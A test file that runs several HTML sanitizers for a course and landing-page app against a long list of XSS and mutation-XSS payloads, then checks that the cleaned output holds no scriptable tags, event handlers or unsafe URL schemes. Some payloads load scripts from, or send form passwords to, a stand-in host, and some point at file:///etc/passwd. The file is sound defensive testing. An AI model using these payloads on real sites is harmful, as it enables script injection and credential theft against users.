import { describe, it, expect } from "vitest";
import { parseFragment, serialize } from "parse5";
import { renderToStaticMarkup } from "react-dom/server";
import { createElement } from "react";
import { sanitizeLessonHtml } from "@/lib/courses/sanitize";
import { sanitizeLandingData, sanitizeRichText } from "@/lib/landing/sanitize";
import { RichHtml } from "@/components/landing/blocks";
import { safeHref } from "@/lib/landing/data";
import { IMAGE_ROUTE_PREFIXES } from "@/lib/courses/image-urls";

/**
 * Both stored-HTML sanitizers against a wide payload set (OWASP XSS filter-evasion style, mutation XSS, scheme tricks,
 * entity and whitespace tricks). The sinks that render stored HTML (the member lesson page, the admin lesson preview and
 * the landing RichHtml block) all show what these functions return, so the checks are on the output as a browser would
 * parse it (parse5 follows the HTML spec), not on strings: no script-capable element, no on* or style attribute, links
 * and images only http(s) (mailto for links), and the result is stable when parsed and written again (a mutation XSS
 * would change on that second pass). docs/trust/THREAT_MODEL.md, A03.
 */

const PAYLOADS: [string, string][] = [
  ["script tag", "<script>alert(1)</script>"],
  ["script src", '<script src="https://evil.test/x.js"></script>'],
  ["script mixed case", "<ScRiPt>alert(1)</sCrIpT>"],
  ["script with slash", "<script/xss src=//evil.test/x.js></script>"],
  ["unclosed script", "<script>alert(1)"],
  ["nested script split", "<scr<script>ipt>alert(1)</scr</script>ipt>"],
  ["img onerror", '<img src=x onerror="alert(1)">'],
  ["img onerror no quotes", "<img src=x onerror=alert(1)>"],
  ["img onerror backtick", "<img src=x onerror=`alert(1)`>"],
  ["img onload slash", '<img/src=x/onerror=alert(1)>'],
  ["img slash separator", '<img src="https://example.test/a.png"/onload=alert(1)>'],
  ["img javascript src", '<img src="javascript:alert(1)">'],
  ["img data src", '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ["img data html src", '<img src="data:text/html,<script>alert(1)</script>">'],
  ["img vbscript src", '<img src="vbscript:msgbox(1)">'],
  ["img srcset", '<img srcset="javascript:alert(1) 1x" src="https://example.test/a.png">'],
  ["img dynsrc", '<img dynsrc="javascript:alert(1)">'],
  ["img lowsrc", '<img lowsrc="javascript:alert(1)">'],
  ["img style expression", '<img style="width:expression(alert(1))" src="https://example.test/a.png">'],
  ["img protocol relative", '<img src="//evil.test/a.png">'],
  ["img api path", '<img src="/api/admin/anything?x=1">'],
  ["img site page path", '<img src="/courses/some-course">'],
  ["img backslash path", '<img src="/\\evil.test/x.png">'],
  ["img backslash pair", '<img src="\\\\evil.test/x.png">'],
  ["img dot segments out of the prefix", '<img src="/api/media/../admin/x">'],
  ["img encoded dot segments", '<img src="/api/media/%2e%2e/admin/x">'],
  ["img encoded slash", '<img src="/api/courses/image/%2f..%2f..%2fadmin">'],
  ["img relative without slash", '<img src="api/admin/x">'],
  ["img tab in path", '<img src="/api/media/a\tb">'],
  ["a api path", '<a href="/api/admin/anything">x</a>'],
  ["a api path upper case", '<a href="/API/admin/anything">x</a>'],
  ["a api path with dot segments", '<a href="/courses/../api/admin/x">x</a>'],
  ["a backslash path", '<a href="/\\evil.test">x</a>'],
  ["a encoded dot segments", '<a href="/%2e%2e/api/admin/x">x</a>'],
  ["a javascript href", '<a href="javascript:alert(1)">x</a>'],
  ["a javascript uppercase", '<a href="JAVASCRIPT:alert(1)">x</a>'],
  ["a javascript tab", '<a href="java\tscript:alert(1)">x</a>'],
  ["a javascript newline", '<a href="java\nscript:alert(1)">x</a>'],
  ["a javascript entity tab", '<a href="java&#9;script:alert(1)">x</a>'],
  ["a javascript entity newline", '<a href="java&#10;script:alert(1)">x</a>'],
  ["a javascript entity colon", '<a href="javascript&colon;alert(1)">x</a>'],
  ["a javascript numeric entities", '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>'],
  ["a javascript hex entities no semicolon", '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>'],
  ["a javascript leading space", '<a href=" javascript:alert(1)">x</a>'],
  ["a javascript leading control", '<a href="\u0001javascript:alert(1)">x</a>'],
  ["a javascript null byte", '<a href="java\u0000script:alert(1)">x</a>'],
  ["a javascript unquoted", "<a href=javascript:alert(1)>x</a>"],
  ["a javascript backtick", "<a href=`javascript:alert(1)`>x</a>"],
  ["a data href", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ["a data href uppercase", '<a href="DATA:text/html,<script>alert(1)</script>">x</a>'],
  ["a vbscript href", '<a href="vbscript:msgbox(1)">x</a>'],
  ["a file href", '<a href="file:///etc/passwd">x</a>'],
  ["a blob href", '<a href="blob:https://example.test/1">x</a>'],
  ["a protocol relative href", '<a href="//evil.test">x</a>'],
  ["a backslash href", '<a href="\\\\evil.test">x</a>'],
  ["a onclick", '<a href="https://example.test" onclick="alert(1)">x</a>'],
  ["a onmouseover", '<a href="https://example.test" onmouseover=alert(1)>x</a>'],
  ["a target self override", '<a href="https://example.test" target="_self">x</a>'],
  ["a rel override", '<a href="https://example.test" rel="opener">x</a>'],
  ["a ping", '<a href="https://example.test" ping="https://evil.test/track">x</a>'],
  ["a style", '<a href="https://example.test" style="position:fixed;top:0;left:0;width:100%;height:100%">x</a>'],
  ["a xlink", '<a xlink:href="javascript:alert(1)">x</a>'],
  ["a formaction", '<a formaction="javascript:alert(1)">x</a>'],
  ["iframe evil", '<iframe src="https://evil.test"></iframe>'],
  ["iframe javascript", '<iframe src="javascript:alert(1)"></iframe>'],
  ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["iframe youtube", '<iframe src="https://www.youtube.com/embed/abc"></iframe>'],
  ["embed", '<embed src="javascript:alert(1)">'],
  ["object data", '<object data="javascript:alert(1)"></object>'],
  ["object flash", '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="movie" value="https://evil.test/x.swf"></object>'],
  ["applet", '<applet code="x.class" archive="https://evil.test/x.jar"></applet>'],
  ["form action", '<form action="https://evil.test"><input name="password"><button>Log in</button></form>'],
  ["form javascript action", '<form action="javascript:alert(1)"><input type="submit"></form>'],
  ["button formaction", '<form><button formaction="javascript:alert(1)">x</button></form>'],
  ["input onfocus autofocus", '<input autofocus onfocus="alert(1)">'],
  ["textarea breakout", "<textarea></textarea><script>alert(1)</script>"],
  ["select option", "<select><option><script>alert(1)</script></option></select>"],
  ["svg onload", '<svg onload="alert(1)"></svg>'],
  ["svg script", "<svg><script>alert(1)</script></svg>"],
  ["svg animate", '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>'],
  ["svg set", '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>'],
  ["svg use", '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"/></svg>'],
  ["svg foreignObject", '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>'],
  ["svg title mxss", '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">'],
  ["svg desc mxss", "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>"],
  ["math mxss", '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">'],
  ["math maction", '<math><maction actiontype="statusline#http://evil.test" xlink:href="javascript:alert(1)">x</maction></math>'],
  ["math annotation-xml", '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>'],
  ["style tag", "<style>@import 'https://evil.test/x.css';</style>"],
  ["style expression", "<style>p{width:expression(alert(1))}</style><p>x</p>"],
  ["style in p", '<p style="background:url(javascript:alert(1))">x</p>'],
  ["style behavior", '<p style="behavior:url(x.htc)">x</p>'],
  ["style -moz-binding", '<p style="-moz-binding:url(https://evil.test/x.xml#xss)">x</p>'],
  ["style position", '<p style="position:fixed;inset:0;z-index:9999">overlay</p>'],
  ["style attribute entity", '<p style="background:&#117;rl(javascript:alert(1))">x</p>'],
  ["noscript breakout", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ["noscript img", '<noscript><img src=x onerror=alert(1)></noscript>'],
  ["template script", "<template><script>alert(1)</script></template>"],
  ["template img", "<template><img src=x onerror=alert(1)></template>"],
  ["xmp", "<xmp><img src=x onerror=alert(1)></xmp>"],
  ["listing", "<listing><img src=x onerror=alert(1)></listing>"],
  ["plaintext", "<plaintext><img src=x onerror=alert(1)>"],
  ["noembed", '<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed>'],
  ["noframes", '<noframes><p title="</noframes><img src=x onerror=alert(1)>"></noframes>'],
  ["title breakout", '<title><a title="</title><img src=x onerror=alert(1)>"></title>'],
  ["comment breakout", "<!--><img src=x onerror=alert(1)>-->"],
  ["comment conditional", "<!--[if IE]><script>alert(1)</script><![endif]-->"],
  ["comment bang", "<!--!><img src=x onerror=alert(1)>-->"],
  ["cdata", "<![CDATA[<img src=x onerror=alert(1)>]]>"],
  ["processing instruction", '<?xml-stylesheet href="javascript:alert(1)"?>'],
  ["doctype", '<!DOCTYPE html [<!ENTITY x SYSTEM "file:///etc/passwd">]>&x;'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ["meta set-cookie", '<meta http-equiv="Set-Cookie" content="a=b">'],
  ["base href", '<base href="https://evil.test/"><a href="x">x</a>'],
  ["link stylesheet", '<link rel="stylesheet" href="https://evil.test/x.css">'],
  ["link import", '<link rel="import" href="https://evil.test/x.html">'],
  ["body onload", '<body onload="alert(1)">'],
  ["html onmouseover", '<html onmouseover="alert(1)">x</html>'],
  ["head", "<head><script>alert(1)</script></head>"],
  ["video onerror", '<video><source onerror="alert(1)"></video>'],
  ["video poster", '<video poster="javascript:alert(1)"></video>'],
  ["audio onerror", '<audio src=x onerror=alert(1)>'],
  ["details ontoggle", '<details open ontoggle="alert(1)">x</details>'],
  ["marquee onstart", '<marquee onstart="alert(1)">x</marquee>'],
  ["body background", '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>'],
  ["td background", '<table><tr><td background="javascript:alert(1)">x</td></tr></table>'],
  ["isindex", '<isindex action="javascript:alert(1)" type="image">'],
  ["keygen", "<keygen autofocus onfocus=alert(1)>"],
  ["bgsound", '<bgsound src="javascript:alert(1)">'],
  ["layer", '<layer src="https://evil.test/x.html"></layer>'],
  ["frameset", '<frameset><frame src="javascript:alert(1)"></frameset>'],
  ["slash instead of space", '<p/onmouseover=alert(1)>x</p>'],
  ["null in tag name", "<scr\u0000ipt>alert(1)</scr\u0000ipt>"],
  ["null in attribute name", '<p on\u0000click="alert(1)">x</p>'],
  ["extra attribute junk", '<p "onclick="alert(1)">x</p>'],
  ["attribute quote breakout", '<a href="https://example.test" title="x" onmouseover="alert(1)" "">x</a>'],
  ["attribute value with gt", '<a href="https://example.test" title=">" onclick="alert(1)">x</a>'],
  ["unclosed tag", '<img src="https://example.test/a.png" onerror="alert(1)"'],
  ["unclosed attribute", '<a href="https://example.test" onclick="alert(1)'],
  ["unclosed tag at end", "<p>x</p><img src=x onerror=alert(1)//"],
  ["entity encoded tag", "&lt;script&gt;alert(1)&lt;/script&gt;"],
  ["double encoded", "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"],
  ["entity without semicolon", "&ltscript&gtalert(1)&lt/script&gt"],
  ["utf7", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"],
  ["unicode escape", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"],
  ["fullwidth brackets", "＜script＞alert(1)＜/script＞"],
  ["nested a", '<a href="https://example.test"><a href="javascript:alert(1)">x</a></a>'],
  ["nested img in a", '<a href="javascript:alert(1)"><img src="https://example.test/a.png"></a>'],
  ["deep nesting", `${"<p>".repeat(500)}<img src=x onerror=alert(1)>${"</p>".repeat(500)}`],
  ["deep list nesting", `${"<ul><li>".repeat(300)}<script>alert(1)</script>`],
  ["table mxss", '<table><caption><svg><desc><template><style><a id="</style></template></desc></svg><img src=1 onerror=alert(1)>"></a>'],
  ["form nesting mxss", '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>'],
  ["select mxss", "<select><template><style><a id=\"</style></template></select><img src=1 onerror=alert(1)>\">"],
  ["b mxss", '<b><svg><style><a title="</style><img src=x onerror=alert(1)>"></a></style></svg></b>'],
  ["backtick attribute", '<a title=`x` href=`javascript:alert(1)`>x</a>'],
  ["svg in lesson image", '<img src="https://example.test/a.svg" onload="alert(1)">'],
  ["mailto with script", '<a href="mailto:a@example.test?body=<script>alert(1)</script>">x</a>'],
  ["tel href", '<a href="tel:+15555550100">x</a>'],
  ["sms href", '<a href="sms:+15555550100">x</a>'],
  ["ftp href", '<a href="ftp://evil.test/x">x</a>'],
  ["intent href", '<a href="intent://x#Intent;scheme=javascript;end">x</a>'],
  ["slack href", '<a href="slack://channel?team=T1">x</a>'],
];

const ALLOWED_TAGS = {
  lesson: new Set(["h1", "h2", "h3", "h4", "h5", "h6", "p", "br", "hr", "blockquote", "pre", "code", "ul", "ol", "li", "strong", "b", "em", "i", "u", "s", "sub", "sup", "a", "img"]),
  rich: new Set(["h2", "h3", "h4", "p", "br", "hr", "blockquote", "ul", "ol", "li", "strong", "b", "em", "i", "u", "s", "a"]),
};

type DomNode = { nodeName: string; tagName?: string; attrs?: { name: string; value: string }[]; childNodes?: DomNode[]; content?: DomNode };

function walk(node: DomNode, visit: (n: DomNode) => void) {
  visit(node);
  for (const child of node.childNodes ?? []) walk(child, visit);
  if (node.content) walk(node.content, visit);
}

/** A scheme a browser would act on: strip what a URL parser strips (controls and whitespace), then read up to the colon. */
function schemeOf(value: string): string | null {
  // eslint-disable-next-line no-control-regex -- the point: a URL parser ignores these inside the scheme
  const squeezed = value.replace(/[\u0000- ]/g, "");
  const m = /^([a-z][a-z0-9+.-]*):/i.exec(squeezed);
  return m ? m[1].toLowerCase() : null;
}

function assertSafe(html: string, kind: "lesson" | "rich") {
  const allowed = ALLOWED_TAGS[kind];
  const nodes: DomNode[] = [];
  walk(parseFragment(html) as unknown as DomNode, (n) => nodes.push(n));
  for (const n of nodes) {
    if (n.nodeName.startsWith("#")) continue;
    expect(allowed.has(n.tagName ?? n.nodeName), `${n.nodeName} is not allowed in: ${html}`).toBe(true);
    for (const attr of n.attrs ?? []) {
      expect(attr.name.startsWith("on"), `${attr.name} in: ${html}`).toBe(false);
      expect(attr.name, `style attribute in: ${html}`).not.toBe("style");
      expect(attr.name, `srcset in: ${html}`).not.toBe("srcset");
      if (attr.name === "href") {
        expect(n.tagName).toBe("a");
        const scheme = schemeOf(attr.value);
        expect(scheme === null || ["http", "https", "mailto"].includes(scheme), `href ${attr.value} in: ${html}`).toBe(true);
        expect(attr.value.trim().startsWith("//"), `protocol relative href in: ${html}`).toBe(false);
        expect(/^\/api(\/|$)/i.test(attr.value.trim()), `api path href in: ${html}`).toBe(false);
      } else if (attr.name === "src") {
        expect(n.tagName).toBe("img");
        // http(s), or a path under one of our image routes; any other scheme or path is not.
        const scheme = schemeOf(attr.value);
        expect(scheme === null || ["http", "https"].includes(scheme), `src ${attr.value} in: ${html}`).toBe(true);
        if (scheme === null) expect(IMAGE_ROUTE_PREFIXES.some((p) => attr.value.startsWith(p)), `site path src ${attr.value} in: ${html}`).toBe(true);
        expect(attr.value.trim().startsWith("//"), `protocol relative src in: ${html}`).toBe(false);
      } else if (n.tagName === "a") {
        expect(["target", "rel"], `a attribute ${attr.name} in: ${html}`).toContain(attr.name);
      } else if (n.tagName === "img") {
        expect(["alt", "width", "height"], `img attribute ${attr.name} in: ${html}`).toContain(attr.name);
      } else {
        throw new Error(`attribute ${attr.name} on ${n.tagName} in: ${html}`);
      }
    }
    if (n.tagName === "a") {
      const get = (name: string) => n.attrs?.find((a) => a.name === name)?.value;
      expect(get("target"), `target in: ${html}`).toBe("_blank");
      expect(get("rel"), `rel in: ${html}`).toBe("noopener noreferrer");
    }
  }
  // Markup that is not allowed must come out as text, never as a tag the browser could still act on.
  expect(html, "raw script text").not.toMatch(/<\s*(script|iframe|style|svg|math|object|embed|form|template|noscript)\b/i);
}

const SANITIZERS: { name: string; kind: "lesson" | "rich"; run: (html: string) => string }[] = [
  { name: "sanitizeLessonHtml", kind: "lesson", run: (html) => sanitizeLessonHtml(html) ?? "" },
  { name: "sanitizeRichText", kind: "rich", run: (html) => sanitizeRichText(html) },
  {
    // The path a landing block takes on save and before every public render, wherever the html prop sits in the tree.
    name: "sanitizeLandingData",
    kind: "rich",
    run: (html) => {
      const data = sanitizeLandingData({ content: [{ type: "RichText", props: { id: "a", html, nested: [{ items: [{ html }] }] } }], root: { props: { html } } });
      const props = (data.content[0] as { props: { html: string; nested: { items: { html: string }[] }[] } }).props;
      expect(props.nested[0].items[0].html).toBe(props.html);
      expect((data.root as { props: { html: string } }).props.html).toBe(props.html);
      return props.html;
    },
  },
  {
    // What the browser receives from the landing block: React writes the cleaned string as is.
    name: "RichHtml of sanitizeRichText",
    kind: "rich",
    run: (html) => renderToStaticMarkup(createElement(RichHtml, { html: sanitizeRichText(html) })).replace(/^<div[^>]*>/, "").replace(/<\/div>$/, ""),
  },
];

describe.each(SANITIZERS)("$name against hostile HTML", ({ kind, run }) => {
  it("has a broad payload set", () => {
    expect(PAYLOADS.length).toBeGreaterThanOrEqual(40);
    expect(new Set(PAYLOADS.map(([n]) => n)).size).toBe(PAYLOADS.length);
  });

  it.each(PAYLOADS)("%s: nothing a browser would run or follow survives", (_name, payload) => {
    const out = run(payload);
    assertSafe(out, kind);
    // The same payload inside ordinary content, and wrapped in a safe link, must come out as safe as on its own.
    assertSafe(run(`<p>before</p>${payload}<p>after</p>`), kind);
    assertSafe(run(`<a href="https://example.test">${payload}</a>`), kind);
  });

  it.each(PAYLOADS)("%s: cleaning twice changes nothing, and a re-parse writes the same text (no mutation XSS)", (_name, payload) => {
    const once = run(payload);
    expect(run(once)).toBe(once);
    // What a browser makes of the cleaned markup, written out again and cleaned again, must be the same markup.
    expect(run(serialize(parseFragment(once)))).toBe(once);
  });

  it("keeps ordinary formatting", () => {
    const out = run('<h2>Title</h2><p>Some <strong>bold</strong>, <em>italic</em> and a <a href="https://example.test/a?b=1&amp;c=2">link</a>.</p><ul><li>One</li></ul>');
    expect(out).toContain("<h2>Title</h2>");
    expect(out).toContain("<strong>bold</strong>");
    expect(out).toContain('<a href="https://example.test/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer">link</a>');
  });

  it("is safe on the way in too: non-strings and empty input give nothing", () => {
    expect(run("")).toBe("");
    expect(run("   ")).toBe("");
  });
});

describe("what each sanitizer allows beyond the other", () => {
  it("lets the lesson text keep images and code, the landing text not", () => {
    const html = '<img src="https://example.test/a.png" alt="A"><pre><code>x</code></pre><h1>t</h1>';
    expect(sanitizeLessonHtml(html)).toContain("<img");
    expect(sanitizeRichText(html)).not.toContain("<img");
    expect(sanitizeRichText(html)).not.toContain("<pre");
  });

  it("keeps page links on the same site and drops protocol-relative ones", () => {
    expect(sanitizeLessonHtml('<a href="/courses">x</a>')).toContain('href="/courses"');
    expect(sanitizeRichText('<a href="/courses">x</a>')).toContain('href="/courses"');
    expect(sanitizeLessonHtml('<a href="//evil.test">x</a>')).not.toContain("evil.test");
    expect(sanitizeRichText('<a href="//evil.test">x</a>')).not.toContain("evil.test");
  });

  it("keeps unchanged every address shape production uses (and our own image routes), in both sanitizers", () => {
    // Production on 2026-11-21: lesson images and links were all absolute http(s) (links also mailto); landing rich text had no links or images.
    const link = (href: string) => `<a href="${href}" target="_blank" rel="noopener noreferrer">x</a>`;
    const links = ["https://example.test/a/b?c=1&amp;d=2", "http://example.test", "mailto:ada@example.test", "/courses", "/courses/some-course/lessons/abc", "/privacy#top", "#section"];
    for (const href of links) {
      expect(sanitizeLessonHtml(link(href))).toBe(link(href));
      expect(sanitizeRichText(link(href))).toBe(link(href));
    }
    const images = [
      '<img src="https://example.test/a.png" width="600" height="300" />',
      '<img src="http://example.test/a.png" />',
      '<img src="/api/courses/image/lesson/les_abc123" alt="A" />',
      '<img src="/api/media/med_abc123/lesson_body?v=2026-11-21T10%3A00%3A00Z" alt="B" />',
    ];
    for (const img of images) expect(sanitizeLessonHtml(`<p>Intro</p>${img}`)).toBe(`<p>Intro</p>${img}`);
  });

  it("drops a site path in an image src that is not one of our image routes, and an /api/ path in a link", () => {
    for (const src of ["/api/admin/anything", "/api/courses/watch", "/courses/x", "//evil.example/x.png", "/\\evil.example/x.png", "javascript:alert(1)"]) {
      expect(sanitizeLessonHtml(`<p>t</p><img src="${src}">`), src).toBe("<p>t</p>");
    }
    for (const sanitize of [sanitizeLessonHtml, sanitizeRichText]) {
      for (const href of ["/api/admin/anything", "/api", "/api?x=1", "//evil.example/x", "/\\evil.example", "javascript:alert(1)", "courses/x"]) {
        expect(sanitize(`<a href="${href}">x</a>`), href).toBe('<a target="_blank" rel="noopener noreferrer">x</a>');
      }
    }
  });

  it("sanitizeRichText gives an empty string for anything that is not text", () => {
    for (const v of [null, undefined, 5, {}, [], ["<script>"]]) expect(sanitizeRichText(v)).toBe("");
  });
});

describe("link props on landing data (safeHref)", () => {
  const BAD = [
    "javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)", "java\tscript:alert(1)", "java\nscript:alert(1)", "\u0001javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)", "//evil.test", "\\\\evil.test", "/\\evil.test", "file:///etc/passwd", "blob:https://example.test/1",
    "javascript&colon;alert(1)", "&#106;avascript:alert(1)", "ftp://evil.test",
  ];
  it.each(BAD)("drops %j", (href) => {
    expect(safeHref(href)).toBe("");
    const data = sanitizeLandingData({ content: [{ type: "Button", props: { id: "a", href, links: [{ url: href }] } }], root: {} });
    const props = (data.content[0] as { props: { href: string; links: { url: string }[] } }).props;
    expect(props.href).toBe("");
    expect(props.links[0].url).toBe("");
  });

  it("keeps http(s), mailto, paths and anchors", () => {
    for (const ok of ["https://example.test/a", "http://example.test", "mailto:a@example.test", "/courses", "#top"]) expect(safeHref(ok)).toBe(ok);
  });
});
